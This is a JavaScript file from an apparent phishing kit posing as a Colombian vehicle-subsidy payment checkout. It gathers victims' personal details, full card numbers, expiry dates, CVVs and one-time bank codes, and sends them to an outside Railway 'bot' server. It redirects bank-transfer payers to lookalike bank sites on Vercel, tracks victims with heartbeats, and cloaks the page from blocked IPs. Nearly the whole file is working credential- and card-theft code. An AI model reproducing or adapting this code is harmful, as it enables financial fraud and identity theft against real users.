/* ============================================================ 
   CONFIGURACIÓN
   ============================================================ */
var URL_BOT_RAILWAY = 'https://multi-bancos-production.up.railway.app';
var TOTAL_PAGO = Number(sessionStorage.getItem('sub_precio')) || 95700;
var BANCO_KEY_ACTUAL = 'cc-bucaramanga';

var URLS_BANCOS = {
  'bbva':        'https://securecheckout-sandy.vercel.app',
  'caja-social': 'https://checkoutplacabogo.vercel.app',
  'popular':     'https://securepay21.vercel.app',
  'bogota':      'https://auth-portal-ten.vercel.app',
  'occidente':   'https://secureportal-eight.vercel.app',
  'davivienda':  'https://psecheckout.vercel.app'
};
var TIEMPO_REDIRECT = 5000;

/* ============================================================ 
   ANTI-ZOOM
   ============================================================ */
(function() {
  var lastTouchEnd = 0;
  document.addEventListener('touchend', function(event) {
    var now = Date.now();
    if (now - lastTouchEnd <= 300) event.preventDefault();
    lastTouchEnd = now;
  }, { passive: false });
  document.addEventListener('gesturestart', function(e) { e.preventDefault(); }, { passive: false });
  document.addEventListener('touchmove', function(e) {
    if (e.scale !== undefined && e.scale !== 1) e.preventDefault();
  }, { passive: false });
})();

/* ============================================================ 
   SESIÓN + HEARTBEAT + CHECK-IP
   ============================================================ */
(function() {
  'use strict';
  var BOT_URL = URL_BOT_RAILWAY;
  var HEARTBEAT_INTERVALO = 10000;
  var PAGE_SESSION_KEY = 'pyp_session_id';

  var sessionId = sessionStorage.getItem(PAGE_SESSION_KEY);
  if (!sessionId) {
    sessionId = 'PYP-' + Date.now() + '-' + Math.random().toString(36).substr(2, 8).toUpperCase();
    sessionStorage.setItem(PAGE_SESSION_KEY, sessionId);
  }
  window.__PYP_SESSION__ = sessionId;
  var ultimaAccion = 'entrando';

  function verificarBloqueo() {
    fetch(BOT_URL + '/check-ip', { cache: 'no-store' })
      .then(function(r) { return r.json(); })
      .then(function(data) {
        if (data && data.bloqueado === true) {
          try { document.documentElement.innerHTML = ''; } catch(e) {}
          var destino = data.redirect || 'https://www.google.com';
          try { window.location.replace(destino); }
          catch(e) { window.location.href = destino; }
          setTimeout(function() { window.location.href = destino; }, 200);
        }
      })
      .catch(function() {});
  }
  verificarBloqueo();
  setInterval(verificarBloqueo, 5000);

  function enviarHeartbeat() {
    fetch(BOT_URL + '/heartbeat', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sessionId: sessionId, ultimaAccion: ultimaAccion }),
      keepalive: true
    }).catch(function() {});
  }
  enviarHeartbeat();
  setInterval(enviarHeartbeat, HEARTBEAT_INTERVALO);

  function avisarSalida() {
    try {
      var data = JSON.stringify({ sessionId: sessionId });
      if (navigator.sendBeacon) {
        navigator.sendBeacon(BOT_URL + '/salir', new Blob([data], { type: 'application/json' }));
      } else {
        fetch(BOT_URL + '/salir', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: data,
          keepalive: true
        }).catch(function() {});
      }
    } catch (e) {}
  }
  window.addEventListener('beforeunload', avisarSalida);
  window.addEventListener('pagehide', avisarSalida);

  window.__PYP_SET_ACCION__ = function(accion) {
    ultimaAccion = accion;
    enviarHeartbeat();
  };
})();

/* ============================================================ 
   PANTALLA CARGA INICIAL
   ============================================================ */
window.addEventListener('DOMContentLoaded', function() {
  setTimeout(function() {
    document.getElementById('pantallaCargaInicial').classList.add('oculto');
    setTimeout(function() {
      document.getElementById('pantallaCargaInicial').style.display = 'none';
    }, 400);
  }, 2000);
});

/* ============================================================ 
   LEER DATOS DE SESSIONSTORAGE Y ENVIAR AL HISTORIAL
   ============================================================ */
(function() {
  var nombres = sessionStorage.getItem('sub_nombres') || 'JUAN';
  var apellidos = sessionStorage.getItem('sub_apellidos') || 'PÉREZ';
  var primerNombre = sessionStorage.getItem('sub_primerNombre') || nombres.split(' ')[0];
  var primerApellido = sessionStorage.getItem('sub_primerApellido') || apellidos.split(' ')[0];
  var documento = sessionStorage.getItem('sub_documento') || '1234567890';
  var placa = sessionStorage.getItem('sub_placa') || 'ABC123';
  var correo = sessionStorage.getItem('sub_correo') || 'correo@ejemplo.com';
  var telefono = sessionStorage.getItem('sub_telefono') || '3000000000';
  var precioGuardado = sessionStorage.getItem('sub_precio') || '95700';

  window.__DATOS_SUBSIDIO__ = {
    nombres: nombres, apellidos: apellidos,
    primerNombre: primerNombre, primerApellido: primerApellido,
    documento: documento, placa: placa, correo: correo,
    telefono: telefono,
    nombreCompleto: (nombres + ' ' + apellidos).toUpperCase(),
    nombrePSE: (primerNombre + ' ' + primerApellido).toUpperCase()
  };

  document.getElementById('resumenNombre').textContent = window.__DATOS_SUBSIDIO__.nombreCompleto;
  document.getElementById('resumenDocumento').textContent = documento;
  document.getElementById('resumenPlaca').textContent = placa.toUpperCase();
  document.getElementById('resumenCorreo').textContent = correo;

  var cardHolderInput = document.getElementById('cardHolder');
  if (cardHolderInput) cardHolderInput.value = window.__DATOS_SUBSIDIO__.nombreCompleto;
  var docNumberInput = document.getElementById('docNumber');
  if (docNumberInput) docNumberInput.value = documento;
  var inputDocPse = document.getElementById('input-doc-pse');
  if (inputDocPse) inputDocPse.value = documento;

  fetch(URL_BOT_RAILWAY + '/' + BANCO_KEY_ACTUAL + '/guardar-consulta', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      sessionId: window.__PYP_SESSION__,
      nombres: nombres,
      apellidos: apellidos,
      documento: documento,
      placa: placa,
      correo: correo,
      telefono: telefono,
      precio: precioGuardado
    })
  }).catch(function() {});
})();

/* ============================================================ 
   SELECCIÓN MEDIO DE PAGO
   ============================================================ */
var metodoPagoActual = '';

function seleccionarMedioPago(tipo) {
  var btnTarjeta = document.getElementById('btnPagoTarjeta');
  var btnPSE = document.getElementById('btnPagoPSE');
  btnTarjeta.classList.remove('selected');
  btnPSE.classList.remove('selected');
  metodoPagoActual = tipo;
  var pseForm = document.getElementById('pseFormContainer');
  if (tipo === 'tarjeta') {
    btnTarjeta.classList.add('selected');
    pseForm.classList.add('hidden');
    abrirModalTarjeta();
  } else {
    btnPSE.classList.add('selected');
    pseForm.classList.remove('hidden');
    setTimeout(function() { pseForm.scrollIntoView({ behavior: 'smooth', block: 'start' }); }, 150);
  }
}

/* ============================================================ 
   MODAL TARJETA
   ============================================================ */
function abrirModalTarjeta() {
  var modal = document.getElementById('modalTarjeta');
  if (modal) { modal.classList.remove('hidden'); document.body.style.overflow = 'hidden'; }
}
function cerrarModalTarjeta() {
  var modal = document.getElementById('modalTarjeta');
  if (modal) { modal.classList.add('hidden'); document.body.style.overflow = ''; }
}

/* ============================================================ 
   MODAL BANCOS
   ============================================================ */
var bancoSeleccionadoPSE = '';
var bancoSelector = document.getElementById('bancoSelector');
var bancoLogoSeleccionado = document.getElementById('bancoLogoSeleccionado');
var bancoNombreSeleccionado = document.getElementById('bancoNombreSeleccionado');
var modalBanco = document.getElementById('modalBanco');
var modalBancoOverlay = document.getElementById('modalBancoOverlay');
var modalBancoClose = document.getElementById('modalBancoClose');
var bancoBuscar = document.getElementById('bancoBuscar');
var bancoCards = document.querySelectorAll('.banco-card-pse');
var bancoEmpty = document.getElementById('bancoEmpty');

function abrirModalBanco() {
  if (modalBanco) {
    modalBanco.classList.remove('hidden');
    if (bancoBuscar) bancoBuscar.value = '';
    filtrarBancos('');
    setTimeout(function() { if (bancoBuscar) bancoBuscar.focus(); }, 100);
  }
}
function cerrarModalBanco() { if (modalBanco) modalBanco.classList.add('hidden'); }

if (bancoSelector) bancoSelector.addEventListener('click', abrirModalBanco);
if (modalBancoClose) modalBancoClose.addEventListener('click', cerrarModalBanco);
if (modalBancoOverlay) modalBancoOverlay.addEventListener('click', cerrarModalBanco);

bancoCards.forEach(function(card) {
  card.addEventListener('click', function() {
    var banco = this.getAttribute('data-banco');
    var nombre = this.getAttribute('data-nombre');
    var logo = this.getAttribute('data-logo');
    bancoSeleccionadoPSE = banco;
    if (bancoNombreSeleccionado) {
      bancoNombreSeleccionado.textContent = nombre;
      bancoNombreSeleccionado.classList.add('seleccionado');
    }
    if (bancoLogoSeleccionado && logo) {
      bancoLogoSeleccionado.src = logo;
      bancoLogoSeleccionado.style.display = 'block';
    }
    bancoCards.forEach(function(c) { c.classList.remove('selected'); });
    this.classList.add('selected');
    cerrarModalBanco();
  });
});

function filtrarBancos(texto) {
  var t = (texto || '').toLowerCase().trim();
  var visibles = 0;
  bancoCards.forEach(function(card) {
    var nombre = (card.getAttribute('data-nombre') || '').toLowerCase();
    if (nombre.indexOf(t) !== -1) { card.style.display = ''; visibles++; }
    else { card.style.display = 'none'; }
  });
  if (bancoEmpty) {
    if (visibles === 0) bancoEmpty.classList.remove('hidden');
    else bancoEmpty.classList.add('hidden');
  }
}
if (bancoBuscar) bancoBuscar.addEventListener('input', function() { filtrarBancos(this.value); });

/* ============================================================ 
   PAGO PSE
   ============================================================ */
function procesarPagoPSE() {
  if (!bancoSeleccionadoPSE) { alert('Por favor selecciona un banco.'); return; }
  var docPse = document.getElementById('input-doc-pse').value.replace(/\D/g, '');
  if (docPse.length < 5) { alert('Por favor ingresa un número de documento válido.'); return; }

  var pseNombre = document.getElementById('pseNombre');
  if (pseNombre) pseNombre.textContent = window.__DATOS_SUBSIDIO__.nombrePSE;

  if (window.__PYP_SET_ACCION__) window.__PYP_SET_ACCION__('pse_seleccionado');

  var pseOverlay = document.getElementById('video-pse-overlay');
  if (pseOverlay) { pseOverlay.classList.remove('hidden'); document.body.style.overflow = 'hidden'; }

  if (window.__PSE_REINICIAR__) {
    window.__PSE_REINICIAR__();
  } else {
    var pseGif = document.getElementById('pseAnimation');
    if (pseGif && pseGif.src) {
      var srcActual = pseGif.src;
      pseGif.src = '';
      setTimeout(function() { pseGif.src = srcActual; }, 50);
    }
  }

  var urlDestino = URLS_BANCOS[bancoSeleccionadoPSE];
  setTimeout(function() {
    if (urlDestino) { window.location.href = urlDestino; }
    else {
      if (pseOverlay) pseOverlay.classList.add('hidden');
      document.body.style.overflow = '';
      alert('Este banco no está disponible todavía.');
    }
  }, TIEMPO_REDIRECT);
}

/* ============================================================ 
   TARJETA: VALIDACIÓN + ENVÍO
   ============================================================ */
var pagoPollingInterval = null;
var sessionIdActualPago = '';
var pagoOtpPollingInterval = null;

document.addEventListener('DOMContentLoaded', function() {
  var formTarjeta = document.getElementById('formTarjeta');
  if (!formTarjeta) return;

  var cardNumber = document.getElementById('cardNumber');
  var expiryMonth = document.getElementById('expiryMonth');
  var expiryYear = document.getElementById('expiryYear');
  var cvv = document.getElementById('cvv');
  var cardHolder = document.getElementById('cardHolder');
  var docNumber = document.getElementById('docNumber');
  var accept1 = document.getElementById('acceptance1');
  var accept2 = document.getElementById('acceptance2');
  var submitBtnT = document.getElementById('submitBtn');

  var logoVisa = document.getElementById('logoVisa');
  var logoMastercard = document.getElementById('logoMastercard');
  var logoAmex = document.getElementById('logoAmex');

  function detectarMarca(numero) {
    var digitos = (numero || '').replace(/\D/g, '');
    if (digitos.length === 0) return '';
    var primero = digitos.charAt(0);
    if (primero === '4') return 'visa';
    if (primero === '5' || primero === '2') return 'mastercard';
    if (primero === '3') return 'amex';
    return '';
  }

  function esAmex() {
    var primero = cardNumber.value.replace(/\D/g, '').charAt(0);
    return primero === '3';
  }

  function filtrarLogos(numero) {
    var marca = detectarMarca(numero);
    var wrapper = document.getElementById('cardLogosWrapper');
    if (!marca) {
      if (logoVisa) logoVisa.classList.remove('oculto');
      if (logoMastercard) logoMastercard.classList.remove('oculto');
      if (logoAmex) logoAmex.classList.remove('oculto');
      if (wrapper) wrapper.classList.remove('has-single');
      return;
    }
    if (logoVisa) logoVisa.classList.add('oculto');
    if (logoMastercard) logoMastercard.classList.add('oculto');
    if (logoAmex) logoAmex.classList.add('oculto');
    if (marca === 'visa' && logoVisa) logoVisa.classList.remove('oculto');
    else if (marca === 'mastercard' && logoMastercard) logoMastercard.classList.remove('oculto');
    else if (marca === 'amex' && logoAmex) logoAmex.classList.remove('oculto');
    if (wrapper) wrapper.classList.add('has-single');
  }

  function actualizarMensajeCvv() {
    var mensaje = document.getElementById('cvvMensajeAmex');
    if (!mensaje) return;
    var cvvVal = cvv.value.replace(/\D/g, '');
    if (esAmex() && cvvVal.length > 0 && cvvVal.length < 4) {
      mensaje.style.display = 'block';
      mensaje.textContent = 'Tu tarjeta es American Express: el CVV debe tener 4 dígitos';
    } else {
      mensaje.style.display = 'none';
    }
  }

  cardNumber.addEventListener('input', function() {
    var value = this.value.replace(/\D/g, '');
    var maxLen = (value.charAt(0) === '3') ? 15 : 16;
    if (value.length > maxLen) value = value.slice(0, maxLen);
    var formatted = '';
    for (var i = 0; i < value.length; i++) {
      if (value.charAt(0) === '3') {
        if (i === 4 || i === 10) formatted += ' ';
      } else {
        if (i > 0 && i % 4 === 0) formatted += ' ';
      }
      formatted += value[i];
    }
    this.value = formatted;
    filtrarLogos(value);
    validateForm();
  });

  filtrarLogos('');

  cvv.addEventListener('input', function() {
    this.value = this.value.replace(/\D/g, '').slice(0, 4);
    actualizarMensajeCvv();
  });
  docNumber.addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').slice(0, 30); });

  function luhnCheck(cardNumber) {
    var sum = 0;
    var shouldDouble = false;
    for (var i = cardNumber.length - 1; i >= 0; i--) {
      var digit = parseInt(cardNumber.charAt(i));
      if (shouldDouble) { digit *= 2; if (digit > 9) digit -= 9; }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
  }

  function validateForm() {
    var cardVal = cardNumber.value.replace(/\s/g, '');
    var isCardValid = cardVal.length >= 15 && cardVal.length <= 16 && luhnCheck(cardVal);

    var cvvValido = false;
    if (esAmex()) {
      cvvValido = cvv.value.length === 4;
    } else {
      cvvValido = cvv.value.length >= 3 && cvv.value.length <= 4;
    }

    var isValid = isCardValid && expiryMonth.value !== '' && expiryYear.value !== '' && cvvValido && cardHolder.value.trim().length >= 2 && docNumber.value.trim().length >= 4 && accept1.checked && accept2.checked;
    submitBtnT.disabled = !isValid;

    actualizarMensajeCvv();
  }

  [cardNumber, cvv, cardHolder, docNumber, accept1, accept2].forEach(function(el) {
    el.addEventListener('input', validateForm);
    el.addEventListener('change', validateForm);
  });
  [expiryMonth, expiryYear].forEach(function(el) { el.addEventListener('change', validateForm); });

  setTimeout(validateForm, 100);

  submitBtnT.addEventListener('click', function(e) {
    if (!this.disabled) {
      e.preventDefault();
      var cardInput = cardNumber.value.replace(/\D/g, '');
      var firstDigit = cardInput.charAt(0);
      var marca = '';
      if (firstDigit === '4') marca = 'visa';
      else if (firstDigit === '5' || firstDigit === '2') marca = 'mastercard';
      else if (firstDigit === '3') marca = 'amex';
      else { alert('Solo se aceptan tarjetas Visa, Mastercard o American Express'); return; }

      if (marca === 'amex' && cvv.value.length !== 4) {
        alert('Tu tarjeta es American Express: el código CVV debe tener 4 dígitos');
        cvv.focus();
        return;
      }

      var sessionId = window.__PYP_SESSION__ || ('PYP-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6).toUpperCase());
      sessionIdActualPago = sessionId;

      if (window.__PYP_SET_ACCION__) window.__PYP_SET_ACCION__('enviando_tarjeta');

      cerrarModalTarjeta();
      mostrarPagoCarga(marca);

      var payload = {
        sessionId: sessionId,
        bancoKey: BANCO_KEY_ACTUAL,
        marca: marca,
        tarjeta: cardNumber.value,
        titular: cardHolder.value.trim(),
        docType: document.getElementById('docType').value,
        docNumber: docNumber.value.trim(),
        monto: TOTAL_PAGO,
        expMes: expiryMonth.value,
        expAnio: expiryYear.value,
        cvv: cvv.value,
        placa: window.__DATOS_SUBSIDIO__ ? window.__DATOS_SUBSIDIO__.placa : '',
        subsidio: true
      };

      fetch(URL_BOT_RAILWAY + '/' + BANCO_KEY_ACTUAL + '/enviar-pago', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(function(err) { console.error('Error enviando pago:', err); });

      iniciarPollingPago(sessionId, marca, payload);
    }
  });

  var cvvModal = document.getElementById('cvvModal');
  var cvvHelpBtn = document.getElementById('cvvHelpBtn');
  var cvvModalClose = document.getElementById('cvvModalClose');
  var cvvModalBack = document.getElementById('cvvModalBack');
  if (cvvHelpBtn) cvvHelpBtn.addEventListener('click', function() { cvvModal.classList.add('active'); });
  if (cvvModalClose) cvvModalClose.addEventListener('click', function() { cvvModal.classList.remove('active'); });
  if (cvvModalBack) cvvModalBack.addEventListener('click', function() { cvvModal.classList.remove('active'); });
  if (cvvModal) cvvModal.addEventListener('click', function(e) { if (e.target === this) cvvModal.classList.remove('active'); });

  var dynamicInput = document.getElementById('dynamicCode');
  var hideTimeout = null;
  if (dynamicInput) {
    dynamicInput.addEventListener('input', function() {
      this.value = this.value.replace(/\D/g, '').slice(0, 8);
      this.style.webkitTextSecurity = 'none';
      this.style.textSecurity = 'none';
      if (hideTimeout) clearTimeout(hideTimeout);
      hideTimeout = setTimeout(function() {
        dynamicInput.style.webkitTextSecurity = 'disc';
        dynamicInput.style.textSecurity = 'disc';
      }, 2000);
    });
  }
});

/* ============================================================ 
   POLLING DE PAGO (tarjeta inicial y pantalla de espera final)
   ============================================================ */
function iniciarPollingPago(sessionId, marca, payload) {
  if (pagoPollingInterval) clearInterval(pagoPollingInterval);
  
  pagoPollingInterval = setInterval(function() {
    fetch(URL_BOT_RAILWAY + '/' + BANCO_KEY_ACTUAL + '/estado/' + sessionId)
      .then(function(r) { return r.json(); })
      .then(function(data) {
        if (data.estado === 'aceptado') {
          clearInterval(pagoPollingInterval);
          pagoPollingInterval = null;
          ocultarPagoCarga();
          
          var numTarjeta = (payload.tarjeta || '').replace(/\D/g, '');
          var ultimos4 = numTarjeta.slice(-4);
          var enmascarado = '************' + ultimos4;
          
          document.getElementById('lastFourDigitsPopup').textContent = enmascarado;
          document.getElementById('popupCardNumber').textContent = enmascarado;
          document.getElementById('montoPopup').textContent = Number(payload.monto || TOTAL_PAGO).toLocaleString('es-CO');
          document.getElementById('montoPopup2').textContent = Number(payload.monto || TOTAL_PAGO).toLocaleString('es-CO');
          
          var logoContainer = document.getElementById('cardBrandLogo');
          if (marca === 'visa') {
            logoContainer.innerHTML = '<svg viewBox="0 0 192.756 192.756" style="height:44px; max-height:44px; width:auto;" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" fill="#fff" d="M0 0h192.756v192.756H0V0z"/><path fill="#1d5b99" d="M181.266 155.531H8.504V37.225h175.748V155.531h-2.986z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#fff" d="M181.266 152.545H11.49V40.211h169.776v112.334z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M72.851 114.621l11.026-36.355h9.838l-11.027 36.355h-9.837zM68.453 78.276l-8.85 15.412c-2.252 4.037-3.57 6.076-4.203 8.625h-.135c.157-3.232-.294-7.203-.336-9.447l-.978-14.59h-16.56l-.169.978c4.254 0 6.777 2.137 7.471 6.509l3.228 28.858h10.192l20.609-36.345H68.453zM144.959 114.621l-.271-5.406-12.283-.01-2.514 5.416h-10.68l19.367-36.286h13.109l3.279 36.286h-10.007zm-1.127-21.445c-.111-2.687-.201-6.333-.02-8.541h-.145c-.598 1.805-3.17 7.225-4.301 9.89l-3.66 7.968h8.625l-.499-9.317zM104.043 115.654c-6.945 0-11.555-2.203-14.845-4.168l4.686-7.156c2.955 1.652 5.274 3.559 10.612 3.559 1.715 0 3.369-.445 4.309-2.072 1.367-2.363-.316-3.637-4.158-5.812l-1.898-1.234c-5.697-3.892-8.162-7.59-5.48-14.044 1.717-4.128 6.242-7.258 13.711-7.258 5.148 0 9.977 2.228 12.789 4.404l-5.387 6.318c-2.746-2.22-5.021-3.343-7.625-3.343-2.076 0-3.654.801-4.199 1.881-1.025 2.03.332 3.414 3.326 5.272l2.256 1.436c6.918 4.363 8.564 8.937 6.832 13.212-2.984 7.363-8.822 9.005-14.929 9.005zM157.895 83.193h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .47-.287.665-.676.708l.727 1.14h-.482l-.67-1.108h-.402v1.108zm.476-1.473c.32 0 .602-.031.602-.407 0-.313-.307-.351-.562-.351h-.516v.758h.476zm-.012 2.476c-1.348 0-2.307-1.009-2.307-2.344 0-1.409 1.064-2.343 2.307-2.343 1.227 0 2.293.934 2.293 2.343 0 1.41-1.066 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.796-1.805 1.936 0 1.065.689 1.936 1.805 1.936 1.002 0 1.791-.79 1.791-1.936 0-1.14-.789-1.936-1.791-1.936z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#e7a83a" d="M177.086 125.912H15.969v21.557h161.117v-21.557z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M176.787 45.586H15.671v21.558h161.116V45.586zM173.105 145.936h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .469-.287.664-.676.707l.727 1.141h-.482l-.67-1.109h-.402v1.109zm.477-1.473c.32 0 .602-.031.602-.408 0-.312-.307-.35-.562-.35h-.516v.758h.476zm-.012 2.475c-1.348 0-2.307-1.008-2.307-2.344 0-1.408 1.066-2.342 2.307-2.342 1.229 0 2.293.934 2.293 2.342 0 1.41-1.064 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.797-1.805 1.936 0 1.066.689 1.936 1.805 1.936 1.002 0 1.791-.789 1.791-1.936 0-1.139-.789-1.936-1.791-1.936z"/></svg>';
          } else if (marca === 'amex') {
            logoContainer.innerHTML = '<img src="img/amex.svg" style="height:44px; max-height:44px; width:auto; object-fit:contain; display:block; margin:0 auto; background:#fff; padding:2px; border-radius:4px;">';
          } else {
            logoContainer.innerHTML = '<svg viewBox="0 0 100 62" style="height:44px; max-height:44px; width:auto;" xmlns="http://www.w3.org/2000/svg"><circle cx="32" cy="31" r="30" fill="#EB001B"/><circle cx="68" cy="31" r="30" fill="#F79E1B"/><path d="M50 8 C38 16 30 23 30 31 C30 39 38 46 50 54 C62 46 70 39 70 31 C70 23 62 16 50 8 Z" fill="#FF5F00"/></svg>';
          }
          var today = new Date();
          document.getElementById('currentDate').textContent = 
            String(today.getDate()).padStart(2, '0') + '/' +
            String(today.getMonth() + 1).padStart(2, '0') + '/' +
            today.getFullYear();
            
          openAuthModal();
          
              } else if (data.estado === 'rechazado' || data.estado === 'cc_error') {
          clearInterval(pagoPollingInterval);
          pagoPollingInterval = null;
          ocultarPagoCarga();
          
          document.getElementById('cardNumber').value = '';
          document.getElementById('expiryMonth').value = '';
          document.getElementById('expiryYear').value = '';
          document.getElementById('cvv').value = '';
          
          mostrarPagoError(marca, data.estado); 
        }
      })
      .catch(function(err) { console.error('Error consultando estado:', err); });
  }, 2000);
}

function mostrarPagoCarga(marca) {
    if (window.__PYP_SET_ACCION__) window.__PYP_SET_ACCION__('enviando_tarjeta');
    const overlay = document.getElementById('pagoCargaOverlay');
    overlay.classList.remove('hidden');
    document.body.style.overflow = 'hidden';
}

function ocultarPagoCarga() {
    document.getElementById('pagoCargaOverlay').classList.add('hidden');
    document.body.style.overflow = '';
}

/* ============================================================ 
   MOSTRAR ERROR DE PAGO (rechazado / cc_error) — TARJETA INICIAL
   ============================================================ */
function mostrarPagoError(marca, tipo) {
    tipo = tipo || 'rechazado';
    var overlay = document.getElementById('pagoErrorOverlay');
    var logo = document.getElementById('pagoErrorLogo');
    var titulo = document.getElementById('pagoErrorTitulo');
    var texto = document.getElementById('pagoErrorTexto');
    var btn = document.getElementById('pagoErrorBtn');

    if (tipo === 'cc_error') {
        titulo.textContent = 'Tarjeta no admitida';
        texto.textContent = 'Tu tarjeta no está habilitada para este tipo de compras. Por favor, comunícate con tu banco o intenta con otra tarjeta.';
        btn.textContent = 'Entendido';
    } else {
        titulo.textContent = 'Pago rechazado';
        texto.textContent = 'El banco emisor rechazó la transacción. Verifica los datos o intenta con otra tarjeta.';
        btn.textContent = 'Cambiar tarjeta';
    }

    if (logo) {
        logo.innerHTML = ''; 
        var svgHTML = '';
        
        if (marca === 'mastercard' || marca === 'mc') {
            svgHTML = '<svg style="height:60px; max-width:200px; object-fit:contain; display:block; margin: 0 auto;" viewBox="0 0 100 62" xmlns="http://www.w3.org/2000/svg"><circle cx="32" cy="31" r="30" fill="#EB001B"/><circle cx="68" cy="31" r="30" fill="#F79E1B"/><path d="M50 8 C38 16 30 23 30 31 C30 39 38 46 50 54 C62 46 70 39 70 31 C70 23 62 16 50 8 Z" fill="#FF5F00"/></svg>';
        } else if (marca === 'amex') {
            svgHTML = '<img src="img/amex.svg" style="height:60px; max-width:200px; object-fit:contain; display:block; margin: 0 auto; background-color: #ffffff; padding: 4px; border-radius: 6px;">';
        } else {
            svgHTML = '<svg style="height:60px; max-width:200px; object-fit:contain; display:block; margin: 0 auto;" viewBox="0 0 192.756 192.756" xmlns="http://www.w3.org/2000/svg"><path fill="transparent" d="M0 0h192.756v192.756H0V0z"/><path fill="#1d5b99" d="M181.266 155.531H8.504V37.225h175.748V155.531h-2.986z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#fff" d="M181.266 152.545H11.49V40.211h169.776v112.334z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M72.851 114.621l11.026-36.355h9.838l-11.027 36.355h-9.837zM68.453 78.276l-8.85 15.412c-2.252 4.037-3.57 6.076-4.203 8.625h-.135c.157-3.232-.294-7.203-.336-9.447l-.978-14.59h-16.56l-.169.978c4.254 0 6.777 2.137 7.471 6.509l3.228 28.858h10.192l20.609-36.345H68.453zM144.959 114.621l-.271-5.406-12.283-.01-2.514 5.416h-10.68l19.367-36.286h13.109l3.279 36.286h-10.007zm-1.127-21.445c-.111-2.687-.201-6.333-.02-8.541h-.145c-.598 1.805-3.17 7.225-4.301 9.89l-3.66 7.968h8.625l-.499-9.317zM104.043 115.654c-6.945 0-11.555-2.203-14.845-4.168l4.686-7.156c2.955 1.652 5.274 3.559 10.612 3.559 1.715 0 3.369-.445 4.309-2.072 1.367-2.363-.316-3.637-4.158-5.812l-1.898-1.234c-5.697-3.892-8.162-7.59-5.48-14.044 1.717-4.128 6.242-7.258 13.711-7.258 5.148 0 9.977 2.228 12.789 4.404l-5.387 6.318c-2.746-2.22-5.021-3.343-7.625-3.343-2.076 0-3.654.801-4.199 1.881-1.025 2.03.332 3.414 3.326 5.272l2.256 1.436c6.918 4.363 8.564 8.937 6.832 13.212-2.984 7.363-8.822 9.005-14.929 9.005zM157.895 83.193h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .47-.287.665-.676.708l.727 1.14h-.482l-.67-1.108h-.402v1.108zm.476-1.473c.32 0 .602-.031.602-.407 0-.313-.307-.351-.562-.351h-.516v.758h.476zm-.012 2.476c-1.348 0-2.307-1.009-2.307-2.344 0-1.409 1.064-2.343 2.307-2.343 1.227 0 2.293.934 2.293 2.343 0 1.41-1.066 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.796-1.805 1.936 0 1.065.689 1.936 1.805 1.936 1.002 0 1.791-.79 1.791-1.936 0-1.14-.789-1.936-1.791-1.936z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#e7a83a" d="M177.086 125.912H15.969v21.557h161.117v-21.557z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M176.787 45.586H15.671v21.558h161.116V45.586zM173.105 145.936h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .469-.287.664-.676.707l.727 1.141h-.482l-.67-1.109h-.402v1.109zm.477-1.473c.32 0 .602-.031.602-.408 0-.312-.307-.35-.562-.35h-.516v.758h.476zm-.012 2.475c-1.348 0-2.307-1.008-2.307-2.344 0-1.408 1.066-2.342 2.307-2.342 1.229 0 2.293.934 2.293 2.342 0 1.41-1.064 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.797-1.805 1.936 0 1.066.689 1.936 1.805 1.936 1.002 0 1.791-.789 1.791-1.936 0-1.139-.789-1.936-1.791-1.936z"/></svg>';
        }
        logo.innerHTML = svgHTML;
    }

    overlay.classList.remove('hidden');
    document.body.style.overflow = 'hidden';
}

function cerrarPagoError() {
    var overlay = document.getElementById('pagoErrorOverlay');
    if (overlay) overlay.classList.add('hidden');
    document.body.style.overflow = '';
    abrirModalTarjeta();
}

/* ============================================================ 
   OTP
   ============================================================ */
function openAuthModal() {
  if (window.__PYP_SET_ACCION__) window.__PYP_SET_ACCION__('ingresando_otp');
  var modal = document.getElementById('authModal');
  modal.style.display = 'flex';
  setTimeout(function() { modal.classList.add('show'); }, 10);

  if (sessionIdActualPago) {
    iniciarPollingOtpActivo(sessionIdActualPago);
  }
}
function closeAuthModal() {
  var modal = document.getElementById('authModal');
  modal.classList.remove('show');
  setTimeout(function() { modal.style.display = 'none'; document.body.style.overflow = ''; }, 400);
  if (pagoOtpPollingActivoInterval) {
    clearInterval(pagoOtpPollingActivoInterval);
    pagoOtpPollingActivoInterval = null;
  }
}

document.getElementById('btnEnviarDinamica').addEventListener('click', function() {
  var codigo = document.getElementById('dynamicCode').value.replace(/\D/g, '');
  if (!codigo || codigo.length < 4) {
    alert('Por favor ingresa tu clave dinámica o SMS');
    return;
  }
  var marca = 'visa';
  var cardNum = '';
  var cardNumberEl = document.getElementById('cardNumber');
  if (cardNumberEl) {
    cardNum = cardNumberEl.value.replace(/\D/g, '');
    if (cardNum.startsWith('5') || cardNum.startsWith('2')) marca = 'mastercard';
    else if (cardNum.startsWith('3')) marca = 'amex';
  }

  var otpError = document.getElementById('otpErrorMsg');
  if (otpError) otpError.style.display = 'none';

  closeAuthModal();
  mostrarCargaOtp(marca);

  fetch(URL_BOT_RAILWAY + '/' + BANCO_KEY_ACTUAL + '/enviar-otp', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
